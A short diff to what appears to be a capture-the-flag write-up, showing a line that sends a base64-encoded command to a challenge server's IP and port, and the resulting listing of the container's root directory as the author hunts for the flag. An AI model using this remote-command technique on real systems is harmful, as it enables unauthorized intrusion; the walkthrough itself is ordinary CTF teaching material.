@@ -125,6 +125,7 @@ print("103.185.38.238:17227/?input=" + query_b64.decode("ascii"))
 ```
 
 After that, let's look at the output!
+
 ```., .., .dockerenv, Hey.txt, Heyhey.txt, Heyheyhey.txt, Heyheyheyhey.txt, bin, boot, dev, etc, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, sys, tmp, usr, var```
 
 We see some txt files in there. It could be the flag! Let's try one of them.
